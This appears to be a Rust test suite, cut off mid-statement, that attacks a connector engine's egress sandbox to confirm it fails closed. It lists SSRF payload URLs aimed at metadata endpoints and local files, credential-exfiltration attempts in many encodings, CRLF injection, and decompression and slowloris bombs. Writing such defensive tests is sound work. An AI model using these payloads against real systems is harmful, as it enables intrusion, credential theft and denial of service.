//! G2 wide: the attack suite for the security lane (NAN-3490). Each test is
//! one attack family; every variant must fail closed with a typed error, and
//! the mock and dialer must show nothing reached a forbidden destination and
//! no secret left in any shape.

mod common;

use std::sync::Arc;
use std::time::{Duration, Instant};

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD;
use bytes::Bytes;
use common::*;
use nano_connector::broker::BrokerError;
use nano_connector::engine::{EngineConfig, EngineError, RunInput};
use nano_connector::policy::{EgressDeny, PolicyError};
use nano_connector::sandbox::{Enforce, SandboxPolicy};
use nano_connector::secrets::SecretSet;
use nano_connector::vrl_exec::{PoolConfig, VrlError, VrlPool};
use serde_json::{Value, json};

const SECRET: &str = "sk_live_THIS-IS-THE-SECRET-42";
const SECRET_B: &str = "tenant-B-token-0123456789";

fn collector(body: &str) -> String {
    format!(
        r#"
version: 1
name: g2
kind: collector
allow:
  - host: api.example.com
    path_prefixes: ["/v1"]
  - host: internal.example.com
auth: {{ type: bearer, credential: TOKEN }}
rate_limit: {{ backoff_ms: 10, max_retries_5xx: 0 }}
{body}
"#
    )
}

/// A program-only stream whose first request goes to `target`.
fn first_hop(target: &str) -> String {
    collector(&format!(
        "streams:\n  - id: s\n    program: |\n      if .response == null {{ {{\"next_request\": {{\"url\": {}}}}} }} else {{ {{\"events\": []}} }}\n",
        serde_json::to_string(target).unwrap()
    ))
}

fn input() -> RunInput {
    RunInput { credentials: creds(&[("TOKEN", SECRET)]), ..Default::default() }
}

fn is_policy(r: &Result<nano_connector::engine::RunOutput, EngineError>) -> bool {
    matches!(r, Err(EngineError::Policy(_)) | Err(EngineError::Broker(BrokerError::Policy(_))))
}

fn secrets() -> SecretSet {
    SecretSet::new([SECRET, SECRET_B])
}

/// No secret shape anywhere in `v` (events, checkpoints, preview output).
fn assert_clean(what: &str, v: &impl ToString) {
    let s = v.to_string();
    assert!(!secrets().contains_str(&s), "{what} carries a secret shape: {}", &s[..s.len().min(400)]);
}

// ---------------------------------------------------------------------------
// SSRF
// ---------------------------------------------------------------------------

#[tokio::test]
async fn ssrf_url_parsing_tricks_never_dial() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": []}))), false).await;
    let h = harness(&mock);
    let long = format!("https://api.example.com/v1/{}", "a".repeat(9000));
    let targets: Vec<&str> = vec![
        // IPv4 spelled every way the WHATWG parser accepts
        "https://2130706433/v1/x",
        "https://0x7f000001/v1/x",
        "https://0177.0.0.1/v1/x",
        "https://127.1/v1/x",
        "https://0/v1/x",
        "https://0x7f.0.0.1/v1/x",
        "https://169.254.169.254./latest/meta-data/",
        "https://%31%36%39.254.169.254/latest/",
        // IPv6 that embeds or reaches internal addresses
        "https://[::ffff:7f00:1]/v1/x",
        "https://[::ffff:169.254.169.254]/v1/x",
        "https://[::ffff:93.184.215.14]/v1/x",
        "https://[64:ff9b::a9fe:a9fe]/v1/x",
        "https://[64:ff9b:1::a9fe:a9fe]/v1/x",
        "https://[2002:a9fe:a9fe::1]/v1/x",
        "https://[2001:0:a9fe:a9fe::1]/v1/x",
        "https://[::a9fe:a9fe]/v1/x",
        "https://[fe80::1]/v1/x",
        "https://[fd00:ec2::254]/latest/meta-data/",
        "https://[::]/v1/x",
        "https://[::1]/v1/x",
        // metadata endpoints outside the private ranges
        "https://100.100.100.200/latest/meta-data/",
        "https://168.63.129.16/machine",
        "https://192.0.0.192/opc/v1/instance/",
        // userinfo, fragments, backslashes and look-alikes
        "https://api.example.com@169.254.169.254/v1/x",
        "https://api.example.com:x@evil.example.com/v1/x",
        "https://169.254.169.254#@api.example.com/v1/x",
        "https://169.254.169.254\\@api.example.com/v1/x",
        "https://api.example.com.evil.example.com/v1/x",
        "https://api.example.com.169.254.169.254.nip.io/v1/x",
        "https://\u{430}pi.example.com/v1/x",
        "https://api.example.com\u{3002}evil.example.com/v1/x",
        "https://api_example.com/v1/x",
        // ports and schemes
        "https://api.example.com:80/v1/x",
        "https://api.example.com:0/v1/x",
        "https://api.example.com:8443/v1/x",
        "http://api.example.com/v1/x",
        "file:///etc/passwd",
        "gopher://api.example.com/v1/x",
        "ftp://api.example.com/v1/x",
        "//169.254.169.254/v1/x",
        // internal names
        "https://localhost/v1/x",
        "https://metadata/computeMetadata/v1/",
        "https://metadata.google.internal./computeMetadata/v1/",
        "https://kubernetes.default.svc/api",
        "https://nano-api.nano.svc.cluster.local/v1",
        "https://x.onion/v1",
        // paths: traversal, encoded separators, NUL, CRLF, outside prefix
        "https://api.example.com/v1/%2e%2e/admin",
        "https://api.example.com/v1/..%2fadmin",
        "https://api.example.com/v1/..%5cadmin",
        "https://api.example.com/v1/x%00.json",
        "https://api.example.com/v1/x%0d%0aHost:%20evil.example.com",
        "https://api.example.com/admin",
        "https://api.example.com/v1x",
        &long,
    ];
    for target in targets {
        let r = run(&h, &spec(&first_hop(target)), input()).await;
        assert!(is_policy(&r.out), "{target}: {:?}", r.out.as_ref().err());
    }
    assert!(mock.requests().is_empty(), "a request reached the mock: {:?}", mock.requests());
    assert!(h.dialer.dialed.lock().unwrap().is_empty(), "something was dialed");
}

#[tokio::test]
async fn dns_answers_in_special_ranges_are_refused_before_connect() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": []}))), false).await;
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    for ip in [
        "0.0.0.0", "10.1.1.1", "100.64.0.1", "100.100.100.200", "127.0.0.53", "168.63.129.16", "169.254.169.254",
        "172.20.0.1", "192.0.0.192", "192.168.0.1", "198.18.0.1", "224.0.0.251", "255.255.255.255", "::",
        "::1", "::ffff:93.184.215.14", "::ffff:10.0.0.1", "64:ff9b::5db8:d70e", "2002:5db8:d70e::1",
        "2001:0:5db8:d70e::1", "fd00:ec2::254", "fe80::1", "ff02::1", "2001:db8::1", "3fff::1",
    ] {
        let h = harness(&mock);
        h.resolver.set("api.example.com", vec![vec![ip]]);
        let r = run(&h, &s, input()).await;
        assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::DnsBlocked { .. }))), "{ip}: {:?}", r.out.as_ref().err());
        assert!(h.dialer.dialed.lock().unwrap().is_empty(), "{ip} was dialed");
    }
    // Platform and tenant deny CIDRs apply to public answers too.
    let mut h = harness(&mock);
    h.cfg.platform_deny = EgressDeny::parse(&[], &["93.184.215.0/24"]).unwrap();
    let r = run(&h, &s, input()).await;
    assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::DnsBlocked { .. }))), "{:?}", r.out.as_ref().err());
    let h = harness(&mock);
    let tenant = RunInput { egress_deny: EgressDeny::parse(&[], &["93.184.215.14"]).unwrap(), ..input() };
    let r = run(&h, &s, tenant).await;
    assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::DnsBlocked { .. }))), "{:?}", r.out.as_ref().err());
    assert!(mock.requests().is_empty());
}

#[tokio::test]
async fn tenant_deny_beats_the_spec_allowlist() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": []}))), false).await;
    let h = harness(&mock);
    // The spec allows api + internal; the tenant denies internal.
    let deny = |hosts: &[&str]| RunInput { egress_deny: EgressDeny::parse(hosts, &[]).unwrap(), ..input() };
    let r = run(&h, &spec(&first_hop("https://internal.example.com/x")), deny(&["internal.example.com"])).await;
    assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::Policy(PolicyError::HostDenied(_))))), "{:?}", r.out.as_ref().err());
    // A suffix deny that covers every allowed host refuses the run up front.
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    let r = run(&h, &s, deny(&[".example.com"])).await;
    assert!(matches!(r.out, Err(EngineError::Policy(PolicyError::HostDenied(_)))), "{:?}", r.out.as_ref().err());
    assert!(mock.requests().is_empty(), "a denied host was contacted");
    // The deny is per run: the same spec without it works.
    assert!(run(&h, &s, input()).await.out.is_ok());
}

// ---------------------------------------------------------------------------
// Redirects and rebinding
// ---------------------------------------------------------------------------

#[tokio::test]
async fn redirect_matrix_revalidates_every_hop() {
    let encoded = percent_encoding::utf8_percent_encode(SECRET, percent_encoding::NON_ALPHANUMERIC).to_string();
    let cases: Vec<(String, &str)> = vec![
        ("https://2130706433/v1/x".into(), "policy"),
        ("https://[::ffff:a9fe:a9fe]/v1/x".into(), "policy"),
        ("http://api.example.com/v1/x".into(), "policy"),
        ("https://u:p@api.example.com/v1/x".into(), "policy"),
        ("//evil.example.com/v1/x".into(), "policy"),
        ("https://api.example.com:8443/v1/x".into(), "policy"),
        ("/v1/%2e%2e/admin".into(), "policy"),
        ("https://internal.example.com/x?key=".to_string() + SECRET, "exfil"),
        ("https://internal.example.com/x?key=".to_string() + &encoded, "exfil"),
        ("https://internal.example.com/x/".to_string() + &STANDARD.encode(SECRET).replace('=', ""), "exfil"),
        ("/v1/start".into(), "loop"),
        ("https://internal.example.com/x".into(), "denied"),
    ];
    for (loc, expect) in cases {
        let l2 = loc.clone();
        let mock = start_mock(
            Arc::new(move |r| if r.path == "/v1/start" { MockResp::status(302, json!({})).header("location", &l2) } else { MockResp::json(json!({})) }),
            false,
        )
        .await;
        let h = harness(&mock);
        let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/start\" }\n"));
        let inp = if expect == "denied" { RunInput { egress_deny: EgressDeny::parse(&["internal.example.com"], &[]).unwrap(), ..input() } } else { input() };
        let r = run(&h, &s, inp).await;
        let ok = match expect {
            "policy" => is_policy(&r.out),
            "exfil" => matches!(r.out, Err(EngineError::CredentialExfil)),
            "loop" => matches!(r.out, Err(EngineError::Cap(_))),
            "denied" => matches!(r.out, Err(EngineError::Policy(PolicyError::HostDenied(_)))),
            _ => false,
        };
        assert!(ok, "{loc} ({expect}): {:?}", r.out.as_ref().err());
        for req in mock.requests() {
            assert_eq!(req.host, "api.example.com", "{loc}: a hop left the origin");
        }
    }

    // A legitimate cross-host hop is followed, but auth is not forwarded.
    let mock = start_mock(
        Arc::new(|r| match (r.host.as_str(), r.path.as_str()) {
            ("api.example.com", "/v1/start") => MockResp::status(307, json!({})).header("location", "https://internal.example.com/data"),
            _ => MockResp::json(json!({"items": [1]})),
        }),
        false,
    )
    .await;
    let h = harness(&mock);
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/start\" }\n    response: { events_path: items }\n"));
    assert_eq!(run(&h, &s, input()).await.out.expect("cross-host redirect").events, 1);
    let reqs = mock.requests();
    assert_eq!(reqs.len(), 2);
    assert!(reqs[0].headers.get("authorization").is_some_and(|a| a.contains(SECRET)));
    assert!(reqs[1].host == "internal.example.com" && !reqs[1].headers.contains_key("authorization"), "auth followed the redirect");
}

#[tokio::test]
async fn pooled_connections_stay_pinned_and_per_run() {
    let mock = start_mock(
        Arc::new(|r| {
            let page: u32 = r.query.get("c").and_then(|c| c.parse().ok()).unwrap_or(0);
            MockResp::json(json!({ "items": [page], "next": if page < 5 { json!((page + 1).to_string()) } else { json!(null) } }))
        }),
        false,
    )
    .await;
    let s = spec(&collector(
        "streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/items\" }\n    response: { events_path: items }\n    pagination: { type: cursor, from: next, param: c }\n",
    ));
    let h = harness(&mock);
    // Public once, then private forever: the pool must never re-resolve.
    h.resolver.set("api.example.com", vec![vec![PUBLIC_IP], vec!["127.0.0.1"]]);
    assert_eq!(run(&h, &s, input()).await.out.expect("run 1").events, 6);
    assert_eq!(h.dialer.dialed.lock().unwrap().len(), 1, "six pages, one connection");
    assert_eq!(h.resolver.calls_for("api.example.com"), 1);
    // A second run (another tenant, say) never inherits that connection or
    // pin: it resolves afresh, and now gets the private answer.
    let r = run(&h, &s, input()).await;
    assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::DnsBlocked { .. }))), "{:?}", r.out.as_ref().err());
    assert_eq!(h.dialer.dialed.lock().unwrap().len(), 1, "no connection crossed runs");

    // Two hosts on one address never share a connection.
    let h = harness(&mock);
    let s = spec(&collector(
        r#"
streams:
  - id: s
    request: { url: "https://api.example.com/v1/items" }
    program: |
      n = int(.state.n) ?? 0
      host = if includes([0, 2, 4], n) { "internal.example.com" } else { "api.example.com" }
      if n < 4 {
        {"events": [n], "state": {"n": n + 1}, "next_request": {"url": "https://" + host + "/v1/items"}}
      } else { {"events": [n]} }
"#,
    ));
    assert_eq!(run(&h, &s, input()).await.out.expect("two hosts").events, 5);
    let dialed = h.dialer.dialed.lock().unwrap().clone();
    assert_eq!(dialed.len(), 2, "one connection per host: {dialed:?}");
}

// ---------------------------------------------------------------------------
// Credential exfiltration
// ---------------------------------------------------------------------------

#[tokio::test]
async fn credentials_cannot_leave_in_any_encoding_or_channel() {
    let mock = start_mock(
        Arc::new(|r| {
            let auth = r.headers.get("authorization").cloned().unwrap_or_default();
            let tok = auth.trim_start_matches("Bearer ").to_string();
            // A hostile (or just chatty) vendor reflects the token every way.
            MockResp::json(json!({
                "items": [
                    {"raw": auth},
                    {"b64": STANDARD.encode(&tok)},
                    {"b64_inner": STANDARD.encode(format!("{{\"session\":\"{tok}\",\"x\":1}}"))},
                    {"b64_inner2": STANDARD.encode(format!("xx{tok}yy"))},
                    {"hex": hex::encode(&tok)},
                    {"pct": percent_encoding::utf8_percent_encode(&tok, percent_encoding::NON_ALPHANUMERIC).to_string()},
                    {"basic": STANDARD.encode(format!("api:{tok}"))},
                ],
            }))
            .header("x-echo", &auth)
            .header("x-echo-b64", &STANDARD.encode(&tok))
        }),
        false,
    )
    .await;
    let h = harness(&mock);

    // 1. Reflection: the program sees only redacted data and forwards what
    //    it saw (body and headers) in a query, a form body and a JSON body.
    let s = spec(&collector(
        r#"
streams:
  - id: s
    request: { url: "https://api.example.com/v1/echo" }
    program: |
      if .state.round == null {
        seen = encode_json({"b": .response.body, "h": .response.headers})
        {"events": .response.body.items, "state": {"round": 1, "seen": seen},
         "next_request": {"query": {"q": slice!(seen, 0, 1500)}, "json": {"j": seen}}}
      } else { {"events": [{"state": .state}]} }
"#,
    ));
    let r = run(&h, &s, input()).await;
    r.out.expect("reflection run succeeds");
    assert_clean("events", &Value::Array(r.sink.events()));
    for (_, cp) in r.store.saves.lock().unwrap().iter() {
        assert_clean("checkpoint", cp);
    }
    for req in mock.requests() {
        assert_clean("outbound query", &req.raw_query);
        assert_clean("outbound body", &String::from_utf8_lossy(&req.body));
    }

    // 2. A program that knows the secret (typed into code) cannot send it in
    //    any encoding, in the path, query, form or JSON body.
    let before = mock.requests().len();
    let b64 = STANDARD.encode(SECRET);
    let hexed = hex::encode(SECRET);
    let pct = percent_encoding::utf8_percent_encode(SECRET, percent_encoding::NON_ALPHANUMERIC).to_string();
    let inner = STANDARD.encode(format!("{{\"k\":\"{SECRET}\"}}"));
    for nr in [
        json!({"url": format!("https://api.example.com/v1/{SECRET}")}),
        json!({"url": format!("https://api.example.com/v1/{b64}")}),
        json!({"url": format!("https://api.example.com/v1/x#{SECRET}")}),
        json!({"query": {"k": hexed}}),
        json!({"query": {"k": pct}}),
        json!({"query": {"k": inner}}),
        json!({"form": {"k": b64}}),
        json!({"json": {"deep": [{"k": SECRET}]}}),
        json!({"json": {"k": inner}}),
    ] {
        let s = spec(&collector(&format!(
            "streams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/echo\" }}\n    program: |\n      if .state.round == null {{ {{\"state\": {{\"round\": 1}}, \"next_request\": {nr}}} }} else {{ {{\"events\": []}} }}\n"
        )));
        let r = run(&h, &s, input()).await;
        assert!(matches!(r.out, Err(EngineError::CredentialExfil)), "{nr}: {:?}", r.out.as_ref().err());
    }
    assert_eq!(mock.requests().len(), before + 9, "only the first page of each run was sent");

    // 3. Error messages: a vendor redirect that puts the token in a path
    //    outside the allowlist would echo it in the policy error. The run
    //    error is scrubbed.
    let mock2 = start_mock(
        Arc::new(|r| {
            let tok = r.headers.get("authorization").cloned().unwrap_or_default().replace("Bearer ", "");
            MockResp::status(302, json!({})).header("location", &format!("/admin/{tok}"))
        }),
        false,
    )
    .await;
    let h2 = harness(&mock2);
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    let r = run(&h2, &s, input()).await;
    let e = r.out.expect_err("redirect outside the prefix fails");
    assert!(matches!(e, EngineError::Scrubbed(_)), "{e:?}");
    assert_clean("error message", &e.to_string());
    assert!(e.to_string().contains("[REDACTED]"));
}

/// A secret with the characters encoders disagree on (`~ / & ' ( ) < >`).
const ODD_SECRET: &str = "sk~live/THIS&IS'(the)<odd>-42";

fn lower_hex(s: &str) -> String {
    let mut out = String::new();
    let mut n = 0;
    for c in s.chars() {
        if n > 0 {
            out.push(c.to_ascii_lowercase());
            n -= 1;
        } else {
            n = if c == '%' { 2 } else { 0 };
            out.push(c);
        }
    }
    out
}

#[tokio::test]
async fn encoder_variants_cannot_smuggle_a_credential() {
    use percent_encoding::{AsciiSet, NON_ALPHANUMERIC, utf8_percent_encode};
    const RFC3986: &AsciiSet = &NON_ALPHANUMERIC.remove(b'-').remove(b'.').remove(b'_').remove(b'~');
    const URI_COMPONENT: &AsciiSet =
        &NON_ALPHANUMERIC.remove(b'-').remove(b'_').remove(b'.').remove(b'!').remove(b'~').remove(b'*').remove(b'\'').remove(b'(').remove(b')');
    let rfc = utf8_percent_encode(ODD_SECRET, RFC3986).to_string();
    let uric = utf8_percent_encode(ODD_SECRET, URI_COMPONENT).to_string();
    let go = ODD_SECRET.replace('<', "\\u003c").replace('>', "\\u003e").replace('&', "\\u0026");
    let mixed = "sk~live%2fTHIS%26IS%27%28the%29%3Codd%3e-42"; // no single encoder writes this
    let odd = || RunInput { credentials: creds(&[("TOKEN", ODD_SECRET)]), ..Default::default() };
    let clean = |what: &str, v: &str| {
        let set = SecretSet::new([ODD_SECRET]);
        assert!(!set.contains_decoded(v.as_bytes()), "{what} carries the secret: {}", &v[..v.len().min(400)]);
    };

    // 1. Responses: a vendor reflecting the token Go-escaped (raw JSON, so
    //    it parses back to the plain secret), lowercase-percent,
    //    encodeURIComponent-style and in a mixed form no shape lists.
    let body = format!(
        r#"{{"items": [{{"go": "{go}"}}, {{"rfc": "{}"}}, {{"uric": "{uric}"}}, {{"mixed": "{mixed}"}}, {{"mixed_key_{mixed}": 1}}]}}"#,
        lower_hex(&rfc)
    );
    let mock = start_mock(
        Arc::new(move |_r| MockResp { status: 200, headers: vec![("content-type".into(), "application/json".into())], body: body.clone().into_bytes() }.header("x-echo", mixed)),
        false,
    )
    .await;
    let h = harness(&mock);
    let s = spec(&collector(
        "streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/echo\" }\n    program: '{\"events\": push(array!(.response.body.items), {\"h\": .response.headers})}'\n",
    ));
    let r = run(&h, &s, odd()).await;
    r.out.expect("reflection run succeeds");
    clean("events", &Value::Array(r.sink.events()).to_string());

    // A non-JSON body that still decodes to the secret cannot be scrubbed
    // in place: the page is refused, the secret goes nowhere.
    let mock_txt = start_mock(Arc::new(move |_r| MockResp::text(&format!("token={mixed}"))), false).await;
    let ht = harness(&mock_txt);
    let s_txt = spec(&collector(
        "streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/echo\" }\n    program: '{\"events\": [.response.body]}'\n",
    ));
    let r = run(&ht, &s_txt, odd()).await;
    assert!(matches!(r.out, Err(EngineError::CredentialInResponse)), "{:?}", r.out.as_ref().err());
    assert!(r.sink.events().is_empty());

    // 2. Outbound: a program that knows the secret cannot send it in any of
    //    these encodings, in the query, a form body or a JSON body.
    let before = mock.requests().len();
    let sends = [
        json!({"query": {"k": lower_hex(&rfc)}}),
        json!({"query": {"k": uric}}),
        json!({"query": {"k": mixed}}),
        json!({"form": {"k": mixed}}),
        json!({"form": {"k": lower_hex(&uric)}}),
        json!({"json": {"k": mixed}}),
        // Go-escaped text in a query: caught on the percent-then-JSON view.
        json!({"query": {"k": go}}),
        json!({"url": format!("https://api.example.com/v1/x?k={mixed}")}),
    ];
    for nr in &sends {
        let s = spec(&collector(&format!(
            "streams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/echo\" }}\n    program: |\n      if .state.round == null {{ {{\"state\": {{\"round\": 1}}, \"next_request\": {nr}}} }} else {{ {{\"events\": []}} }}\n"
        )));
        let r = run(&h, &s, odd()).await;
        assert!(matches!(r.out, Err(EngineError::CredentialExfil)), "{nr}: {:?}", r.out.as_ref().err());
    }
    assert_eq!(mock.requests().len(), before + sends.len(), "only the first page of each run was sent");

    // 3. A cross-host redirect carrying the token in a form only a decoder
    //    sees is refused before the hop is dialled.
    let mock2 = start_mock(
        Arc::new(move |r| {
            if r.host == "internal.example.com" {
                return MockResp::json(json!({"items": ["reached"]}));
            }
            MockResp::status(302, json!({})).header("location", &format!("https://internal.example.com/collect?k={mixed}"))
        }),
        false,
    )
    .await;
    let h2 = harness(&mock2);
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    response: { events_path: items }\n"));
    let r = run(&h2, &s, odd()).await;
    assert!(matches!(r.out, Err(EngineError::CredentialExfil)), "{:?}", r.out.as_ref().err());
    assert!(mock2.requests().iter().all(|q| q.host != "internal.example.com"), "the hop was dialled");
    for q in mock.requests().iter().chain(mock2.requests().iter()) {
        clean("outbound query", &q.raw_query);
        clean("outbound body", &String::from_utf8_lossy(&q.body));
    }
}

#[tokio::test]
async fn derived_oauth_tokens_are_redacted_like_credentials() {
    const ACCESS: &str = "at_derived_ACCESS_TOKEN_777";
    let mock = start_mock(
        Arc::new(|r| match r.path.as_str() {
            "/oauth/token" => MockResp::json(json!({"access_token": ACCESS, "expires_in": 3600})),
            _ => MockResp::json(json!({"items": [{"echo": r.headers.get("authorization"), "b64": STANDARD.encode(ACCESS)}]})),
        }),
        false,
    )
    .await;
    let h = harness(&mock);
    let s = spec(
        r#"
version: 1
name: g2
kind: collector
allow:
  - host: api.example.com
auth: { type: oauth2_client_credentials, token_url: "https://api.example.com/oauth/token", client_id_credential: CID, client_secret_credential: CSECRET }
streams:
  - id: s
    request: { url: "https://api.example.com/v1/x" }
    response: { events_path: items }
"#,
    );
    let r = run(&h, &s, RunInput { credentials: creds(&[("CID", "client-id-0001"), ("CSECRET", "client-secret-0002")]), ..Default::default() }).await;
    r.out.expect("oauth run");
    let ev = Value::Array(r.sink.events()).to_string();
    assert!(!SecretSet::new([ACCESS]).contains_str(&ev), "access token reached an event: {ev}");
}

#[tokio::test]
async fn preview_output_never_shows_a_secret() {
    let spec_yaml = r#"
version: 1
name: g2
kind: collector
allow:
  - host: api.example.com
auth: { type: api_key_query, param: key, credential: KEY }
streams:
  - id: s
    request: { url: "https://api.example.com/v1/x" }
    response: { events_path: items }
"#;
    let recording = vec![nano_connector::preview::Recorded {
        method: None,
        host: "api.example.com".into(),
        path: "/v1/x".into(),
        query: Default::default(),
        status: 200,
        headers: [("x-echo".to_string(), SECRET.to_string())].into_iter().collect(),
        body: json!({"items": [{"key": SECRET}, {"b64": STANDARD.encode(SECRET)}, {"url": format!("https://api.example.com/v1/x?key={SECRET}")}]}),
    }];
    let out = nano_connector::preview::preview(
        worker_exe(),
        &spec(spec_yaml),
        recording,
        nano_connector::preview::PreviewInput {
            config: Default::default(),
            credentials: creds(&[("KEY", SECRET)]),
            artifact: None,
            now: None,
            max_events_shown: 10,
            checkpoints: Default::default(),
            all_batches: true,
        },
    )
    .await;
    assert_eq!(out["ok"], true, "{out}");
    assert_eq!(out["events"], 3);
    assert_clean("preview output", &out);
}

// ---------------------------------------------------------------------------
// Response-side resource attacks
// ---------------------------------------------------------------------------

#[tokio::test]
async fn decompression_and_encoding_bombs_are_capped() {
    use std::io::Write;
    let zlib_bomb = {
        let mut z = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
        let zeros = vec![0u8; 1 << 20];
        for _ in 0..100 {
            z.write_all(&zeros).unwrap();
        }
        z.finish().unwrap()
    };
    // 2,000 tiny gzip members: MultiGzDecoder must stay under the cap too.
    let members = {
        let mut out = Vec::new();
        for _ in 0..2000 {
            let mut g = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::best());
            g.write_all(&vec![b'x'; 64 * 1024]).unwrap();
            out.extend(g.finish().unwrap());
        }
        out
    };
    let mock = start_mock(
        Arc::new(move |r| match r.path.as_str() {
            "/v1/deflate" => MockResp { status: 200, headers: vec![("content-encoding".into(), "deflate".into())], body: zlib_bomb.clone() },
            "/v1/members" => MockResp { status: 200, headers: vec![("content-encoding".into(), "gzip".into())], body: members.clone() },
            "/v1/stacked" => MockResp { status: 200, headers: vec![("content-encoding".into(), "gzip, gzip".into())], body: vec![1, 2, 3] },
            "/v1/br" => MockResp { status: 200, headers: vec![("content-encoding".into(), "br".into())], body: vec![1, 2, 3] },
            _ => MockResp::json(json!({})),
        }),
        false,
    )
    .await;
    let h = harness(&mock);
    let run_path = |p: &str| spec(&collector(&format!("limits: {{ max_decompressed_bytes: 16777216 }}\nstreams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/{p}\" }}\n")));
    for (p, want) in [("deflate", "cap"), ("members", "cap"), ("stacked", "enc"), ("br", "enc")] {
        let r = run(&h, &run_path(p), input()).await;
        let ok = match want {
            "cap" => matches!(r.out, Err(EngineError::Broker(BrokerError::DecompressedTooLarge(16777216)))),
            _ => matches!(r.out, Err(EngineError::Broker(BrokerError::Encoding(_)))),
        };
        assert!(ok, "{p}: {:?}", r.out.as_ref().err());
    }

    // An endless chunked body with no Content-Length.
    let chunk = {
        let data = vec![b'a'; 64 * 1024];
        let mut c = format!("{:x}\r\n", data.len()).into_bytes();
        c.extend(data);
        c.extend(b"\r\n");
        Bytes::from(c)
    };
    let raw = start_raw_mock(vec![
        Raw::Write(Bytes::from_static(b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n")),
        Raw::Repeat(chunk, 100_000),
    ])
    .await;
    let h = harness(&raw);
    let s = spec(&collector("limits: { max_response_bytes: 8388608 }\nstreams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    let r = run(&h, &s, input()).await;
    assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::ResponseTooLarge(8388608)))), "{:?}", r.out.as_ref().err());

    // A header bomb: more headers than the client accepts, and one huge one.
    for head in [
        format!("HTTP/1.1 200 OK\r\n{}Content-Length: 2\r\n\r\n{{}}", (0..500).map(|i| format!("x-h{i}: v\r\n")).collect::<String>()),
        format!("HTTP/1.1 200 OK\r\nx-big: {}\r\nContent-Length: 2\r\n\r\n{{}}", "a".repeat(512 * 1024)),
    ] {
        let raw = start_raw_mock(vec![Raw::Write(Bytes::from(head))]).await;
        let h = harness(&raw);
        let r = run(&h, &spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n")), input()).await;
        assert!(matches!(r.out, Err(EngineError::Broker(BrokerError::Http(_)))), "{:?}", r.out.as_ref().err());
    }
}

#[tokio::test]
async fn slowloris_responses_hit_their_timeouts() {
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    let tight = |h: &mut Harness| {
        h.cfg.broker.connect_timeout = Duration::from_millis(800);
        h.cfg.broker.header_timeout = Duration::from_millis(800);
        h.cfg.broker.body_idle_timeout = Duration::from_millis(800);
        h.cfg.broker.response_timeout = Duration::from_millis(2000);
    };
    let drip = |b: &'static [u8], every: u64| -> Vec<Raw> {
        b.iter().flat_map(|c| [Raw::Sleep(Duration::from_millis(every)), Raw::Write(Bytes::copy_from_slice(&[*c]))]).collect()
    };
    let cases: Vec<(&str, Vec<Raw>, &str)> = vec![
        ("tls handshake never answered", vec![Raw::StallHandshake], "tls handshake"),
        ("headers dripped", drip(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}", 150), "response headers"),
        (
            "body stalls",
            vec![Raw::Write(Bytes::from_static(b"HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n{")), Raw::Sleep(Duration::from_secs(10))],
            "response body stalled",
        ),
        (
            "body dripped under the idle timeout",
            [vec![Raw::Write(Bytes::from_static(b"HTTP/1.1 200 OK\r\nContent-Length: 100\r\n\r\n"))], drip(&[b' '; 100], 300)].concat(),
            "response",
        ),
    ];
    for (name, script, want) in cases {
        let raw = start_raw_mock(script).await;
        let mut h = harness(&raw);
        tight(&mut h);
        let t = Instant::now();
        let r = run(&h, &s, input()).await;
        assert!(matches!(&r.out, Err(EngineError::Broker(BrokerError::Timeout(w))) if *w == want), "{name}: {:?}", r.out.as_ref().err());
        assert!(t.elapsed() < Duration::from_secs(4), "{name} took {:?}", t.elapsed());
    }
}

// ---------------------------------------------------------------------------
// VRL resource attacks and state
// ---------------------------------------------------------------------------

#[tokio::test]
async fn hostile_vrl_cannot_crash_or_starve_the_host() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": [1]}))), false).await;
    let h = harness(&mock);
    // Compiler stack bombs: in-process, each of these aborts the whole host.
    for program in ["[".repeat(50_000) + &"]".repeat(50_000), "!".repeat(50_000) + "true", "1".to_string() + &" + 1".repeat(60_000)] {
        let s = spec(&collector(&format!("streams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/x\" }}\n    program: {}\n", serde_json::to_string(&program).unwrap())));
        let r = run(&h, &s, input()).await;
        assert!(matches!(r.out, Err(EngineError::Spec(_))), "{:?}", r.out.as_ref().err().map(|e| e.to_string().chars().take(200).collect::<String>()));
        // validate goes through a worker too.
        assert!(nano_connector::preview::validate(worker_exe(), &s).await.is_err());
    }
    assert!(mock.requests().is_empty(), "a program that does not compile sent a request");

    // Output flood: a program whose answer exceeds the output cap.
    let s = spec(&collector(&format!(
